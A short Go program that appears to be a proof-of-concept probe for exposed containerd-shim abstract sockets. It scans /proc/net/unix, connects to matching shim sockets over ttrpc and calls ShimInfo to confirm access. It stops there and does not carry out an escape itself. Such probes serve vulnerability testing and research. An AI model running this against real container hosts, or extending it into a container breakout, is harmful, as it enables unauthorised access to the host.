package main

import (
	"context"
	"errors"
	"io/ioutil"
	"log"
	"net"
	"regexp"
	"strings"

	"github.com/containerd/ttrpc"
	"github.com/gogo/protobuf/types"
)

func exp(sock string) bool {
	sock = strings.Replace(sock, "@", "", -1)
	conn, err := net.Dial("unix", "\x00"+sock)
	if err != nil {
		log.Println(err)
		return false
	}

	client := ttrpc.NewClient(conn)
	shimClient := NewShimClient(client)
	ctx := context.Background()
	info, err := shimClient.ShimInfo(ctx, &types.Empty{})
	if err != nil {
		log.Println("rpc error:", err)
		return false
	}

	log.Println("shim pid:", info.ShimPid)
	return true
}

func getShimSockets() ([][]byte, error) {
	re, err := regexp.Compile("@/containerd-shim/.*\\.sock")
	if err != nil {
		return nil, err
	}
	data, err := ioutil.ReadFile("/proc/net/unix")
	matches := re.FindAll(data, -1)
	if matches == nil {
		return nil, errors.New("Cannot find vulnerable socket")
	}
	return matches, nil
}

func main() {
	matchset := make(map[string]bool)
	socks, err := getShimSockets()
	if err != nil {
		log.Fatalln(err)
	}
	for _, b := range socks {
		sockname := string(b)
		if _, ok := matchset[sockname]; ok {
			continue
		}
		log.Println("try socket:", sockname)
		matchset[sockname] = true
		if exp(sockname) {
			break
		}
	}

	return
}
